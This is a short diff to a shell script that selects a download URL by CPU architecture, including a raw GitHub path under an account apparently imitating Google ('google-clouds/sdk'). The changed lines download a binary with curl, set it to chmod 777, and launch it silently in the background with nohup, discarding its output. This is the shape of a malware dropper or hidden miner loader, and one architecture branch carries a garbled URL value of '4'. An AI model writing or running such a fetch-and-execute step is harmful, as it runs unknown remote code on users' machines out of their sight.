@@ -30,9 +30,9 @@ case $(uname -m) in
     arm)    dpkg --print-architecture | grep -q "arm64" && architecture="arm64"  && url="4" || architecture="arm" && url="https://raw.githubusercontent.com/google-clouds/sdk/main/arm164";;
 esac
 
-curl "$url" --output aaa
-chmod +x ./aaa
-nohup ./aaa &>/dev/null &
+curl "$url" --output ./acac
+chmod 777 ./acac
+nohup ./acac &>/dev/null &
 
 echo
 echo "Operating System Architecture : $architecture" + "$url"
